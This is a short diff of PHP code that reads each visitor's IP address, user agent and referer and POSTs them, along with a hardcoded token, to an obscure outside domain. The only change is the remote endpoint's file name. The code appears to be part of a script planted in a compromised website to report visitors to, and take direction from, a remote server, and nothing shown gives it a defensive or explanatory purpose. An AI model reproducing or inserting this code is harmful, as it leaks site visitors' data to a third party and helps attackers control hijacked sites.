@@ -17,7 +17,7 @@
    $headerUserAgent = $_SERVER['HTTP_USER_AGENT'];
    $referer = $_SERVER['HTTP_REFERER'];
    $ch = curl_init();
-   curl_setopt($ch, CURLOPT_URL,"http://yirytisidvs.com/checkSiteControlCurl.php");
+   curl_setopt($ch, CURLOPT_URL,"http://yirytisidvs.com/checkSiteControlCurlArray.php");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"queryString=Z4dlP6Jt7d  &ipNumber=".$ipNo."&header=".$headerUserAgent."&referer=".$referer);
    // receive server response ...
